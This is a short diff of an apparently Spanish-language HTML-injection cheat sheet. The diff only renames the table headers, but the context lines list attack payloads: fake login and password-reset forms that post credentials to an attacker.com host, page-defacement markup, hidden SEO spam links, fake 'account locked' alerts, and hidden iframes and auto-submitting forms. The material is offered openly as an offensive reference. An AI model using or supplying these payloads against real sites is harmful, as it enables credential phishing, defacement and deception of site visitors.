@@ -22,7 +22,7 @@ linked:
 
 ## Phishing via Fake Form / Login
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Fake login form | `<form action="https://attacker.com/log" method="POST"><input name="user"><input name="pass" type="password"><button>Login</button></form>` | Captures creds. |
 | Fake reset password | `<form action="//attacker"><input name="email"></form>` | Same UX. |
@@ -59,7 +59,7 @@ ___
 
 ## Defacement / Page Modification
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Insert offensive content | `<h1 style="color:red">DEFACED</h1>` | Standard defacement. |
 | Replace logo | `<img src="https://attacker/troll.png" style="position:absolute;top:0;...">` | Visual replace. |
@@ -79,7 +79,7 @@ ___
 
 ## SEO / Social Engineering Links
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Inject SEO spam links | `<a href="https://spam.com">Buy Pills</a>` × N | Search engine ranking abuse. |
 | Hidden links | `<a href="..." style="display:none;">x</a>` | Invisible to user pero crawled. |
@@ -98,7 +98,7 @@ ___
 
 ## Visible Content Injection
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Misleading text | `<h2>Special offer for you!</h2>` | UX confusion. |
 | Fake notifications | `<div class="alert">Your account is locked!</div>` | Panic UX. |
@@ -118,7 +118,7 @@ ___
 
 ## Hidden Elements / Iframe Abuse
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Hidden iframe | `<iframe src="https://attacker" style="display:none">` | Background actions. |
 | Hidden form | `<form style="display:none" action="..." onload="...">` | Auto-submit form. |
